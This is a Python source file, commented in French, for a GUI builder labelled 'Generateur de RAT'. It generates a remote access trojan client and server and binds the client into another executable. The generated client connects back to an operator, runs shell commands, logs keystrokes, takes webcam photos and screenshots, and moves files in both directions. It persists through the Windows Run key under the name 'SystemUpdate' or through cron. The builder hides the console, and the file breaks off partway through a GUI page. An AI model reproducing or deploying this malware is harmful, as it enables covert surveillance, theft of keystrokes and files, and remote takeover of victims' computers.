import customtkinter as ctk
from tkinter import filedialog, messagebox
from customtkinter  import CTkProgressBar
import os
import subprocess
import sys
import shutil
import time 
import tempfile
import zipfile
import threading
import itertools

result = subprocess.run("where python", capture_output=True, text=True, shell=True)

# Récupérer le premier résultat de la sortie (par ligne)
python_path = result.stdout.splitlines()[0]


def create_exe_with_nuitka(input_file: str, exe_name: str = None):
    """
    Genere un fichier .exe a partir d'un script Python en utilisant Nuitka avec nettoyage automatique.
    
    :param input_file: Chemin vers le fichier Python source.
    :param exe_name: Nom de l'executable genere (facultatif).
    """
    try:
        # Verification des prerequis
        if not os.path.isfile(input_file):
            raise FileNotFoundError(f"Le fichier specifie '{input_file}' n'existe pas.")

        # Nom par defaut pour l'executable
        if not exe_name:
            exe_name = os.path.splitext(os.path.basename(input_file))[0] + ".exe"
        basename=os.path.basename(input_file)
        if(basename=="server1.py"):
        # Commande Nuitka pour la creation de l'executable
            command = [
                python_path,
                "-m", "nuitka",
                "--standalone",       # Cree un executable autonome
                "--onefile",          # Genere un seul fichier executable
                "--mingw64",          # Utilise le compilateur MinGW64
                "--nofollow-imports" # Importer seullment les bib importants
            ]
        else:
             command = [
                python_path,
                "-m", "nuitka",
                "--standalone",       # Cree un executable autonome
                "--onefile",          # Genere un seul fichier executable
                "--mingw64",          # Utilise le compilateur MinGW64
                "--windows-disable-console", # ne pas affiche le terminal
                "--nofollow-imports" # Importer seullment les bib importants
            ]
        # Ajouter le fichier d'entree
        command.append(input_file)

        # Executer la commande Nuitka
        print(f"Execution de la commande : {' '.join(command)}")
        result = subprocess.run(command, text=True, capture_output=True)

        # Verifier le statut de retour
        if result.returncode == 0:
            print("Compilation reussie.")

            # Deplacer l'executable genere vers le dossier courant
            exe_path = None
            for root, _, files in os.walk("dist"):
                for file in files:
                    if file.endswith(".exe"):
                        exe_path = os.path.join(root, file)
                        break
                if exe_path:
                    break

            if exe_path and os.path.isfile(exe_path):
                shutil.move(exe_path, os.path.join(os.getcwd(), exe_name))
                print(f"Fichier executable deplace dans le dossier courant : {exe_name}")
            else:
                print("Fichier genere introuvable.")
            
            # Nettoyer les dossiers temporaires
            for folder in ["dist", "build", "__pycache__"]:
                if os.path.isdir(folder):
                    shutil.rmtree(folder)
                    print(f"Dossier '{folder}' supprime.")
        else:
            print(f"Erreur lors de l'execution de Nuitka : {result.stderr}")
            print(f"Sortie standard : {result.stdout}")

    except FileNotFoundError as e:
        print(f"Erreur : {e}")
    except subprocess.SubprocessError as e:
        print(f"Erreur liee au sous-processus : {e}")
    except Exception as e:
        print(f"Une erreur inattendue est survenue : {e}")

def create_zip_file(zip_path, file_path, client_path):
    """Creates a ZIP file containing the specified file and the client executable."""
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        zipf.write(file_path, os.path.basename(file_path))
        zipf.write(client_path, os.path.basename(client_path))

def extract_zip_file(zip_path, extract_to):
    """Extracts the contents of the ZIP file to the specified directory."""
    with zipfile.ZipFile(zip_path, 'r') as zipf:
        zipf.extractall(extract_to)

def create_temp_script(file_path, client_path):
    """
    Creates a temporary Python script that extracts files from the ZIP,
    opens the specified file, and executes the client executable in the background.
    """
    binder_code = f"""
import os
import subprocess
import sys
import time
import tempfile
import zipfile

def cleanup_files(*files):
    # Deletes the extracted files
    for file in files:
        try:
            os.remove(file)
        except Exception as e:
            print(f"Error deleting {{file}}: {{e}}")

def extract_zip_file(zip_path, extract_to):
    \"\"\"Extracts the contents of the ZIP file to the specified directory.\"\"\" 
    try:
        print(f"Extracting {{zip_path}} to {{extract_to}}...")
        with zipfile.ZipFile(zip_path, 'r') as zipf:
            zipf.extractall(extract_to)
        print("Extraction complete.")
    except zipfile.BadZipFile:
        print(f"Error: {{zip_path}} is not a valid ZIP file.")
    except PermissionError:
        print(f"Error: Permission denied for {{zip_path}}.")
    except Exception as e:
        print(f"Error extracting ZIP file: {{e}}")

def execute_and_show():
    with tempfile.TemporaryDirectory() as temp_dir:
        print(f"Created temporary directory: {{temp_dir}}")
        
        # Chemin relatif vers le fichier ZIP
        zip_path = os.path.join(os.path.dirname(__file__), 'files.zip')
        print(f"ZIP file path: {{zip_path}}")
        
        # Vérifier que le fichier ZIP existe
        if not os.path.exists(zip_path):
            print(f"Error: {{zip_path}} does not exist.")
            return
        
        # Extraire le fichier ZIP
        extract_zip_file(zip_path, temp_dir)

        # Chemins des fichiers extraits
        file_path = os.path.join(temp_dir, '{os.path.basename(file_path)}')
        client_path = os.path.join(temp_dir, '{os.path.basename(client_path)}')
        print(f"Extracted file path: {{file_path}}")
        print(f"Extracted client path: {{client_path}}")

        # Ouvrir le fichier spécifié (non bloquant)
        try:
            if '{os.path.splitext(file_path)[1]}' == '.exe':
                print(f"Executing {{file_path}}...")
                subprocess.Popen([str(file_path)], shell=True)
            else:
                print("Unsupported extension!")
        except Exception as e:
            print(f"Error opening the file: {{e}}")  

        # Exécuter le fichier client en arrière-plan (non bloquant)
        try:
            print(f"Executing {{client_path}}...")
            subprocess.Popen([str(client_path)], shell=True)
        except Exception as e:
            print(f"Error executing the EXE file: {{e}}")

        # Nettoyer les fichiers extraits après l'exécution
        time.sleep(20)  # Attendre 20 secondes avant de nettoyer
        print("Cleaning up extracted files...")
        cleanup_files(file_path, client_path)

if __name__ == "__main__":
    execute_and_show()
"""
    # Crée le fichier temporaire
    temp_file = os.path.join(tempfile.gettempdir(), "temp_binder.py")
    with open(temp_file, "w", encoding="utf-8") as f:
        f.write(binder_code)
    return temp_file

def build_executable_with_nuitka(temp_script, zip_path, output_name, output_dir, icon_path):
    """
    Builds a standalone executable containing the script and the ZIP file using Nuitka.
    """
    try:
        subprocess.run([
            python_path,
            "-m", "nuitka",
            "--standalone",             
            "--onefile",                
            "--mingw64",                
            "--windows-disable-console", 
            "--output-dir=" + output_dir,
            "--windows-icon-from-ico=" + icon_path,
            f"--include-data-files={zip_path}=files.zip",  
            f"--output-filename={output_name}",  
            temp_script
        ], check=True)
    except subprocess.CalledProcessError as e:
        raise RuntimeError("Error creating the executable with Nuitka.") from e


def clean_temp_files(temp_script):
    """Deletes the temporary script."""
    try:
        os.remove(temp_script)
    except Exception as clean_error:
        print(f"Error cleaning temporary files: {clean_error}")
        

import subprocess
import sys

      





def bind_files(file_path, client_path, icon_path, output_dir):
    """
    Combines opening a specified file with executing a client EXE into a single executable.
    """
    zip_path = os.path.join(tempfile.gettempdir(), 'files.zip')
    create_zip_file(zip_path, file_path, client_path)

    temp_script = create_temp_script(file_path, client_path)

    file_name = os.path.basename(file_path)  # here we give the filename to inject  
    full_output_path = os.path.join(output_dir, file_name)
    
    build_executable_with_nuitka(temp_script, zip_path, file_name, output_dir, icon_path)
   
    clean_temp_files(temp_script)

    print(f"Combined file '{full_output_path}' generated successfully.")



def create_victim_script1():
    victim_script_content = """#!/usr/bin/python3

import socket
import subprocess
import time
import os
import sys
import shutil
import platform
import json
import threading
import cv2
import io
import keyboard
import pyautogui
if platform.system() == "Windows":
    import winreg as reg
else:
    reg=None

time_interval = 10
text = ""

# Configuration de l'environnement selon l'OS
if platform.system() == "Windows":
    hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")
else:
    hidden_folder = os.path.join(os.path.expanduser('~/.config'), "SecretFolder", "keystrokes") 

os.makedirs(hidden_folder, exist_ok=True)  # Creer le repertoire cache s'il n'existe pas

def get_new_keystroke_file_path():
    # Creer un nouveau nom de fichier avec un timestamp unique
    timestamp = time.strftime("%Y%m%d-%H%M%S")  # Format : 20250101-103000
    hidden = hidden_folder  # Remplacez ceci par le chemin reel du dossier cache
    return os.path.join(hidden, f"keystrokes_{timestamp}.txt")


# Fichier de touches
keystroke_file_path = ""

# Variable pour suivre l'etat de l'enregistrement
is_recording = False

#la fonction qui vas envoyer la resultat des commande executer 
def sending(command):
    try:
        json_data = json.dumps(command)
        s.send(json_data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

#la fonction qui vas recever les commande a executer 
def receive():
    json_data = ""
    while True:
        try:
            chunk = s.recv(4096).decode()
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue
        except Exception:
            print(f"Error receiving data: {s}")
            break
    """

    with open("client1.py", "w") as file:
        file.write(victim_script_content)





def add_code_to_victim_script2():
    victim_script_content2 = """
def record_keystrokes():
    global is_recording
    try:
        with open(keystroke_file_path, 'a', encoding='utf-8') as data_file:
            data_file.write(f"Started recording at {time.ctime()}\n")
            while is_recording:
                event = keyboard.read_event()  

                if event.event_type == 'down':  
                    key = event.name

                    # Gestion des touches spéciales
                    if len(key) == 1:
                        data_file.write(key)
                    elif key == 'space':
                        data_file.write(' ')
                    elif key == 'enter':
                        data_file.write('\n')
                    elif key == 'tab':
                        data_file.write('\t')
                    elif key == 'backspace':
                        data_file.write('[BACKSPACE]')
                    else:
                        data_file.write(f'[{key.upper()}]') 

                    data_file.flush() 

                time.sleep(0.01)  
    except Exception as e:
        print(f"Error while recording keystrokes: {str(e)}")


# Fonction pour demarrer l'enregistrement
def start_keylogger():
    global is_recording, keystroke_file_path
    # Reinitialiser le chemin du fichier de frappes avec un nouveau fichier unique
    keystroke_file_path = get_new_keystroke_file_path()
    
    # Vider le fichier de frappes au debut
    try:
        with open(keystroke_file_path, 'w') as data_file:
            data_file.write("")  # Vider le contenu
    except Exception as e:
        print(f"Error resetting keystroke file: {str(e)}")
    
    is_recording = True
    threading.Thread(target=record_keystrokes, daemon=True).start()


# Fonction pour arreter l'enregistrement
def stop_keylogger():
    global is_recording
    is_recording = False  
    
def send_keystrokes_file():
    try:
        time.sleep(2)  # Délai pour s'assurer que le fichier est bien écrit
        print(keystroke_file_path)
        if os.path.getsize(keystroke_file_path) == 0:
            print("Keystroke file is empty, skipping send.")
            sending({"status": "error", "message": "File is empty."})
            return

        with open(keystroke_file_path, 'r',encoding='utf-8') as file:
            file_data = file.read()
            print(f"File data before hex conversion: {file_data}")  
            byte_data = file_data.encode('utf-8')
            hex_data = byte_data.hex()  
            print(f"File data after hex conversion: {hex_data}")  
        sending({"status": "success", "data": hex_data})
    except Exception as e:
        sending({"status": "error", "message": str(e)})   

#la fonction qui vas duppliquer le client.exe dans un emplacemment sain pour eviter de supprimer par le vicitme

def duplicate_client(client_path):
    try:
        if platform.system() == "Windows":
            # Chemin discret sous AppData\Roaming
            hidden_folder = os.path.join(os.getenv('APPDATA'), "SystemTools")
        else:
            # Chemin discret sous ~/.local/share
            hidden_folder = os.path.join(os.path.expanduser("~/.local/share"), "SystemTools")

        # Creer le dossier s'il n'existe pas
        os.makedirs(hidden_folder, exist_ok=True)

        # Chemin cible pour le fichier
        target_path = os.path.join(hidden_folder, os.path.basename(client_path))
        
        # Copier le fichier s'il n'existe pas encore
        if not os.path.exists(target_path):
            with open(client_path, 'rb') as src, open(target_path, 'wb') as dst:
                dst.write(src.read())
            print(f"Client duplique dans : {target_path}")
        else:
            print(f"Le fichier existe deja dans : {target_path}")
        return target_path
    except Exception as e:
        print(f"Erreur lors de la duplication du fichier : {e}")
        return None

#

def add_persistence():
    script_path = sys.argv[0]  # Chemin de l'executable en cours
    try:
        # Dupliquer le fichier dans un emplacement sur
        duplicated_path = duplicate_client(script_path)

        if platform.system() == "Windows":
            # Ajouter au registre Windows
            registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            app_name = "SystemUpdate"  # Nom visible dans le registre

            if duplicated_path:
                with reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key_path, 0, reg.KEY_SET_VALUE) as reg_key:
                    reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, f'"{duplicated_path}"')
                return f"Persistance ajoutee pour : {duplicated_path}"
            else:
                return "Erreur lors de la duplication pour la persistance."
        else:
            # Ajouter une tache cron sous Linux
            if duplicated_path:
                cron_job = f"@reboot {duplicated_path}\\n"
                cron_file_path = os.path.expanduser("~/.crontab")
                with open(cron_file_path, "a") as cron_file:
                    cron_file.write(cron_job)
                return f"Persistance ajoutee pour : {duplicated_path} dans la crontab"
            else:
                return "Erreur lors de la duplication pour la persistance."

    except Exception as e:
        return f"Erreur lors de la configuration de la persistance : {str(e)}"

# fonction pour le  keylooger
def handle_keylogger_command(command):
    if command.strip() == "keylogger start":
        # Demarrer l'enregistrement des touches
        start_keylogger()
        sending("Keystroke recording started.")
    elif command.strip() == "keylogger stop":
        # Arreter l'enregistrement et envoyer le fichier
        stop_keylogger()
        time.sleep(1)
        send_keystrokes_file()
    else:
        sending(f"Unknown keylogger command: {command}")



# fonction pour prendre une photo de la cible 
def camera_handler():
    try:
        # Ouvrir la camera
        capture = cv2.VideoCapture(0)
        if not capture.isOpened():
            sending("Error: Could not access the camera.")
            return

        # Capturer une seule image
        ret, frame = capture.read()
        if not ret or frame is None:
            sending("Error: Could not capture an image from the camera.")
            capture.release()
            return

        # Encoder l'image en format PNG et convertir en hexadecimal
        success, buffer = cv2.imencode(".png", frame)
        if not success:
            sending("Error: Could not encode the image.")
            capture.release()
            return

        image_data = buffer.tobytes().hex()

        # Envoyer l'image encodee au serveur
        sending({"status": "success", "data": image_data})
    except Exception as e:
        sending(f"Error: {str(e)}")
    finally:
        capture.release()
        cv2.destroyAllWindows()

# fonction pour faire des screenshot de la machine cible 

def screenshot_handler():
    try:
        print("Attempting to capture screenshot...")  # Debug message
        # Capturer une capture d'ecran
        screenshot = pyautogui.screenshot()
        
        # Sauvegarder l'image dans un buffer au format PNG
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        buffer.seek(0)

        # Envoyer les donnees de l'image encodee en hexadecimal
        sending({"status": "success", "data": buffer.getvalue().hex()})
        print("Screenshot captured and sent successfully.")  # Debug message
    except Exception as e:
        print(f"Screenshot capture error: {str(e)}")  # Debug message
        sending({"status": "error", "message": str(e)})

#fonction pour transmetre des fichiers 
def upload_handler(command):
    try:
        # Extraire le nom du fichier, le chemin cible et les donnees
        parts = command.split(" ", 2)
        if len(parts) < 3:
            sending("Error: Invalid upload command format.")
            return False
        
        filename = parts[0]  # Nom du fichier dans la commande (e.g., README.md)
        target_path = parts[1]  # Chemin cible specifie par le serveur
        filedata = parts[2]  # Donnees hexadecimales du fichier
        
        # Si le chemin cible est un repertoire ou se termine par "/", ajoutez le nom du fichier
        if target_path.endswith("/") or os.path.isdir(target_path):
            target_path = os.path.join(target_path, filename)
        
        # Verification des permissions d'ecriture pour le repertoire cible
        target_folder = os.path.dirname(target_path)
        if not os.access(target_folder, os.W_OK):
            sending(f"Error: No write permission for the directory {target_folder}.")
            return False
        
        # Creer le repertoire si necessaire
        os.makedirs(target_folder, exist_ok=True)
        
        # ecrire les donnees dans le fichier cible
        with open(target_path, "wb") as f:
            f.write(bytes.fromhex(filedata))
        
        sending(f"File uploaded successfully to {target_path}.")
        return True
    except ValueError:
        sending("Error: Invalid hexadecimal data for file content.")
    except Exception as e:
        sending(f"Error uploading file: {str(e)}")
        return False

# fonction pour recuperer des fichiers 
def download_file(command):
    try:
        filepath = command[9:].strip()
        with open(filepath, "rb") as f:
            sending({"status": "success", "data": f.read().hex()})
    except FileNotFoundError:
        sending({"status": "error", "message": "File not found"})
    except Exception as e:
        sending({"status": "error", "message": str(e)})

# fonction des commandes de base 
def handle_command(command):
    if command is None:
        print("Connection closed by the server.")
        return False
    
    # Traitement de la commande quitter le shell
    if command.lower() in ["exit", "quit"]:
        print("Command received to end connection.")
        return False
    
    return True

# fonction les commandes de shell 
def execute_command(command):
    try:
        proc = subprocess.Popen(
            command, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        )
        result = proc.stdout.read() + proc.stderr.read()
        sending(result.decode('utf-8', errors='replace'))
    except Exception as e:
        sending(f"Error executing command: {str(e)}")

def shell():
    while True:
        try:
            command = receive()
            if not handle_command(command):
                break
            
            #taritemment de la commande changer l'emplacemment
            elif command.startswith("cd "):  # Gerer la commande 'cd'
                try:
                    os.chdir(command[3:])
                    # Envoyer le nouveau repertoire au serveur
                    sending(f"Changed directory to {os.getcwd()}")
                except FileNotFoundError:
                    sending("Directory not found.")
                except Exception as e:
                    sending(f"Error changing directory: {str(e)}")
                continue

"""
    
    with open("client1.py", "a") as file:  # Ouvrir en mode ajout
        file.write(victim_script_content2)


#add code 

def add_code_to_victim_script():
    code_to_add = """
            # Executer toutes les autres commandes
            execute_command(command)

        except socket.error as e:
            print(f"Socket error: {e}")
            break
        except Exception as e:
            print(f"General error: {e}")
            sending(f"Error: {str(e)}")

    print("Exiting shell...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connection()
finally:
    s.close()"""
    
    with open("client1.py", "a") as file:  # Ouvrir en mode ajout
        file.write(code_to_add)


def add_ip_and_port_to_victim_script(ip, port):    
    code_to_add = """
#la fonction qui vas etablire la connectiviter
def connection():
    global s
    while True:
        try:
            s.connect((ip_address, port))
            shell()
            break  # Exit loop after successful shell session
        except socket.error as e:
            print(f"Connection error: {e}")
            continue  # Retry after sleep interval
        """
    with open("client1.py", "a") as file:  # Ouvrir en mode ajout
        file.write(f"\n")
        file.write(f"port = {port}\n")
        file.write(f"ip_address = \"{ip}\"\n")
        file.write(code_to_add)

def create_server_1():
    code_content = """#!/usr/bin/python3

import platform
import socket
import json
import os
import time

# Create a global variable for the socket and client connection
s = None
target = None
ip = None
reper = os.getcwd()

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
base_dir = os.path.join(desktop_path, "Clients")  # Dossier racine sur le bureau


def create_client_folder(client_ip):
    \"\"\"
    Cree un dossier pour le client base sur son adresse IP.
    \"\"\"
    client_folder = os.path.join(base_dir, client_ip)
    if not os.path.exists(client_folder):
        os.makedirs(os.path.join(client_folder, "screenshots"), exist_ok=True)
        os.makedirs(os.path.join(client_folder, "downloads"), exist_ok=True)
        os.makedirs(os.path.join(client_folder, "keylogger"), exist_ok=True)
    return client_folder



def clear_screen():
    \"\"\"
    Nettoie l'ecran en fonction du systeme d'exploitation.
    \"\"\"
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    
    
def show_help():
    \"\"\"
    Affiche une liste des commandes disponibles.
    \"\"\"
    help_text = \"\"\"
    Liste des commandes disponibles : 
    ---------------------------------
    cd <path>                 : Changer le repertoire sur la machine cible.
    cd                        : Afficher le repertoire courant sur la machine cible.
    (option)download <file>   : Telecharger un fichier depuis la machine cible.
    (option)upload <file>     : Envoyer un fichier vers la machine cible.
    (option)screenshot        : Capturer une capture d'ecran de la machine cible.
    (option)camera            : Capturer une image depuis la webcam de la machine cible.
    (option)keylogger start   : Demarrer l'enregistrement des touches.
    (option)keylogger stop    : Arreter et telecharger les donnees du keylogger.
    (option)persistance       : Configurer la persistance sur la machine cible.
    clear/cls         : Nettoyer l'ecran.
    help              : Afficher cette aide.
    exit/quit         : Quitter la session.
    \"\"\"
    print(help_text)    
#la fonction pour etablire la connexion avec la machine vicitme
def connection():
    global s, target, ip

    # Create a new socket instance
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Configure the socket
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    """

    with open("server1.py", "w") as file:
        file.write(code_content)

def create_server_2(ip, port):    
    code_to_add = """
    # Bind the socket to an IP address and port
    s.bind((ip_address, port))

    # Start listening for incoming connections
    s.listen(5)
    print("Listening for incoming connections...")

    # Accept an incoming connection
    target, ip = s.accept()
    print(f"Connected to {ip}")
    create_client_folder(ip[0]) #creer un dossier pour le client

#la fonction qui vas fair l'envoi des commandes vers la machine de la vicitme
def sending(command):
    # Convert the command to JSON format and send it
    json_data = json.dumps(command)
    target.send(json_data.encode())

#la fonction qui vas recever les resultats des commande executer dans la machine de la vicitme
def receive():
    json_data = ""
    while True:
        try:
            # Receive data from the target in chunks
            chunk = target.recv(4096).decode('utf-8', errors='replace')
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue


#la fonction global qui possede les appelles aux fonction declarer dans le haut + possede les fonctionaliter de trojan ...
def shell():
    global reper
    try:
        client_folder = create_client_folder(ip[0])  # Dossier du client connecte
        while True:
            #un simple affichage 
            command = input(f"* Shell#{ip} ==> : ")
            
            #la commande pour quite le shell    
            if command.lower() in ["exit", "quit"]:
                sending(command)
                print("Command received to end connection.")
                break
            
            #la commande pour savoire votre emplacemment dans la machine de la victime    
            elif command.startswith("cd "):  # Gestion des commandes cd
                sending(command)
                response = receive()
                print(response)
                continue
            
            elif command.lower() in ["clear", "cls"]:
                clear_screen()
                continue

            elif command.lower() == "help":
                show_help()
                continue
            
             #la commande pour puise fair changer le repertoire dans la machine de la vicitime   
            elif command.strip() == "cd":  # Verifier le repertoire courant
                sending(command)
                response = receive()  # Recevoir le repertoire courant
                reper = response
                print(f"Current directory: {response}")
                continue
            
            elif command.strip() == "screenshot":
                sending(command)
            
                # Reception de la reponse
                response = receive()
            
                # Verifier si response est un dictionnaire
                if isinstance(response, dict):  # Si receive() retourne un dictionnaire
                    # Verifier si la capture d'ecran a reussi
                    if response.get("status") == "success":
                        try:
                            screenshot_data = response.get("data")
                            if not screenshot_data:
                                print("No screenshot data received.")
                                continue
            
                            # Chemin de sauvegarde
                            timestamp = time.strftime("%Y%m%d-%H%M%S")  # Ex : 20250101-103000
                            screenshot_path = os.path.join(client_folder, "screenshots", f"{timestamp}_ScreenShot.png")
            
                            # Sauvegarder l'image
                            with open(screenshot_path, "wb") as f:
                                f.write(bytes.fromhex(screenshot_data))
                            print(f"Screenshot saved successfully at {screenshot_path}.")
                        except Exception as e:
                            print(f"Error saving screenshot: {str(e)}")
                    else:
                        print(f"Error taking screenshot: {response.get('message')}")
                else:
                    print("Error: Received response is not a dictionary.")
                continue

            
            elif command.startswith("download "):
                # Verifier si un chemin ou un fichier a ete specifie apres "download "
                if len(command.strip()) <= len("download "):
                    print("Error: Please specify a file or directory to download.")
                    print("Usage: upload <remote_target_path>")
                    continue
            
                # Envoyer la commande
                sending(command)
                response = receive()
            
                # Verifier la reponse
                if isinstance(response, dict) and response.get("status") == "success":
                    # Extraire le nom du fichier demande
                    filename = os.path.basename(command[9:].strip())
                    filepath = os.path.join(client_folder, "downloads", filename)
            
                    # Sauvegarder le fichier dans le repertoire Downloads
                    try:
                        with open(filepath, "wb") as f:
                            f.write(bytes.fromhex(response["data"]))
                        print(f"File downloaded successfully: {filepath}")
                    except Exception as e:
                        print(f"Error saving file: {str(e)}")
                else:
                    # Si la reponse contient un message d'erreur
                    error_message = response.get("message") if isinstance(response, dict) else "Unknown error"
                    print(f"Error downloading file: {error_message}")
                continue
            
            #la commande pour puise uploader des fichier dans la machine de vicitime 
            elif command.startswith("upload "):
                try:
                    # Recuperer le chemin source (local au serveur) et le chemin cible (destination sur le client)
                    parts = command.split(" ", 2)
                    if len(parts) < 3:
                        print("Error: Please specify parametres.")
                        print("Usage: upload <local_file_path> <remote_target_path>")
                        continue

                    local_path = parts[1]  # Chemin du fichier sur le serveur
                    remote_target = parts[2]  # Chemin cible sur le client

                    # Verifier si le fichier source existe
                    if not os.path.exists(local_path):
                        print(f"File '{local_path}' does not exist.")
                        continue

                    # Lire et convertir les donnees du fichier
                    with open(local_path, "rb") as f:
                        filedata = f.read().hex()

                    # Envoyer la commande au client
                    sending(f"upload {remote_target} {filedata}")
                    response = receive()
                    print(response)
                except Exception as e:
                    print(f"Error uploading file: {str(e)}")
                continue
            
            if command.strip() == "camera":
                sending(command)  # Envoyer la commande au client
                response = receive()  # Recevoir la reponse du client
                if isinstance(response, dict) and response.get("status") == "success":
                    # Recuperer les donnees de l'image
                    image_data = bytes.fromhex(response.get("data"))
        
                    # Chemin de sauvegarde dans le dossier du client
                    image_folder = os.path.join(client_folder, "screenshots")
                    os.makedirs(image_folder, exist_ok=True)  # S'assurer que le dossier existe

                    # Nommer le fichier en fonction de l'heure pour eviter les conflits
                    image_path = os.path.join(image_folder, f"camera_image_{time.strftime('%Y%m%d_%H%M%S')}.png")
        
                    # Enregistrer l'image capturee
                    with open(image_path, "wb") as f:
                        f.write(image_data)

                    print(f"Image successfully saved at: {image_path}")
                else:
                    print(f"Failed to capture image: {response}")
                continue

            
            elif command.strip() == "keylogger start":
                # Envoi de la commande pour demarrer l'enregistrement des touches
                sending(command)
                response = receive()  # Reponse du client
                print(response)  # Afficher le message de statut
                continue
            
            elif command.strip() == "keylogger stop":
                # Envoyer la commande pour arreter l'enregistrement
                sending(command)
            
                # Attendre la reponse
                response = receive()
            
                # Verifier si la reponse est deja un dictionnaire
                if isinstance(response, dict):
                    if response.get("status"):
                        # Verifier si la reponse est reussie
                        if response.get("status") == "success":
                            # Recuperer le chemin du fichier et creer un nom unique pour le fichier de frappes
                            timestamp = time.strftime("%Y%m%d-%H%M%S")  # Format : 20250101-103000
                            keystrokes_path = os.path.join(client_folder, "keylogger", f"keystrokes_{timestamp}.txt")
            
                            # Sauvegarder le fichier de frappes recu dans le dossier approprie
                            try:
                                with open(keystrokes_path, "wb") as f:
                                    f.write(bytes.fromhex(response["data"]))  # Convertir les donnees hexadecimales en bytes et les ecrire
                                print(f"Keystrokes file saved at: {keystrokes_path}")
                            except Exception as e:
                                print(f"Error saving keystrokes file: {str(e)}")
                        else:
                            print(f"Failed to receive keystrokes file: {response.get('message')}")
                    else:
                        print("Response does not contain a 'status' field.")
                else:
                    print("Received response is not a dictionary. Please check the `receive()` function.")
            
            # Code cote serveur pour envoyer la commande persistance
            elif command.strip() == "persistance":
                sending(command)  # Envoyer la commande au client pour qu'il configure la persistance
                response = receive()  # Attendre la reponse du client (statut)
                print(response)  # Afficher si la persistance a etee configuree avec succes
                continue




            # Envoyer d'autres commandes au client
            sending(command)
            response = receive()
            print(response)

    except KeyboardInterrupt:
        print("Interruption by user!")



# le main
if __name__ == "__main__":
    try:
        connection()
        shell()
    finally:
        # Ensure the socket and connection are properly closed
        if target:
            target.close()
        if s:
            s.close()
        """
    with open("server1.py", "a") as file:  # Ouvrir en mode ajout
        file.write(f"\n")
        file.write(f"    port = {port}\n")
        file.write(f"    ip_address = \"{ip}\"")
        file.write(code_to_add)


class Controller:
    def destroy_page(self, page_name):
        # Verifie si la page existe dans le dictionnaire
        if page_name in self.pages:
            page = self.pages[page_name]
            page.destroy()  # Detruit la page de l'interface graphique
            del self.pages[page_name]  # Supprime la page du dictionnaire

#handel
def handle_button_click(self):
        # Appeler la methode save_and_next
        self.save_and_next()
        # Appeler la methode add_code_to_victim_script
        self.add_code_to_victim_script()


# ajouter le code keylogger dans le code victim 

def add_keylogger_code_to_victim_script(self):
        keylogger_code = """
           elif command.startswith("keylogger"):
                handle_keylogger_command(command)
                continue
"""
        # Ajouter le code dans le fichier victim.py
        with open("client1.py", "a") as file:
            file.write(keylogger_code)
        print("Code du keylogger ajoute dans victim.py")
    

# Configuration globale pour un design moderne
ctk.set_appearance_mode("dark")  # Theme sombre
ctk.set_default_color_theme("blue")  # Palette de couleurs modernes

class Application(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Generateur de RAT")
        self.geometry("580x500")  # Taille augmentee pour plus d'espace visuel
        self.resizable(False, False)  # Empêche le redimensionnement pour preserver le design
        self.user_choices = {
            "options": [],
            "file_to_inject": None,
            "extension": ".exe",
            "output_path": None,
            "icon_path": None,
            "ip_address": "127.0.0.1",
            "port": 8080,
            "ip_address2": "127.0.0.1",
            "python_path":None,
        }

        # Configuration principale pour que tout le contenu s'etende
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        # Conteneur principal
        self.container = ctk.CTkFrame(self, corner_radius=15, border_width=2, border_color="#444")
        self.container.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")

         # Configurer le conteneur pour qu'il s'adapte à son contenu
        self.container.grid_rowconfigure(0, weight=1)
        self.container.grid_columnconfigure(0, weight=1)
        
        # Initialisation des pages
        self.pages = {}
        for Page in (IntroductionPage, OptionsPage, FileSelectionPage, NetworkSettingsPage, OutputPage , WaitingPage):
            page_name = Page.__name__
            page = Page(parent=self.container, controller=self)
            self.pages[page_name] = page
            page.grid(row=0, column=0, sticky="nsew")

        self.show_page("IntroductionPage")

    def show_page(self, page_name):
        """Afficher une page specifique."""
        page = self.pages[page_name]
        page.tkraise()

class CenteredFrame(ctk.CTkFrame):
    """Cadre professionnel avec un design soigne."""
    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        self.inner_frame = ctk.CTkFrame(self, corner_radius=15, fg_color="#2E2E2E", border_width=1, border_color="#444")
        self.inner_frame.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")

class IntroductionPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Bienvenue dans le Generateur de RAT",
                     font=("Arial", 28, "bold"), text_color="lightblue").pack(pady=20)

        ctk.CTkLabel(self.inner_frame, text="Creez un RAT personnalise avec des fonctionnalites avancees\n"
                                            "et injectez-le dans un fichier cible.",
                     font=("Arial", 18), justify="center").pack(pady=20)

        # Code pour afficher la page OptionsPage
        ctk.CTkButton(self.inner_frame, text="Commencer",
                font=("Arial", 18), corner_radius=10,
                command=lambda: controller.show_page("NetworkSettingsPage")).pack(pady=30)

class OptionsPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Options du RAT",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        ip_address = self.controller.user_choices.get("ip_address")
        port = self.controller.user_choices.get("port")
        # Description et liste d'options avec des cases a cocher
        self.options = {
            "Keylogger": "Enregistre toutes les frappes du clavier.",
            "Ouvrir la webcam": "Active la webcam pour espionner.",
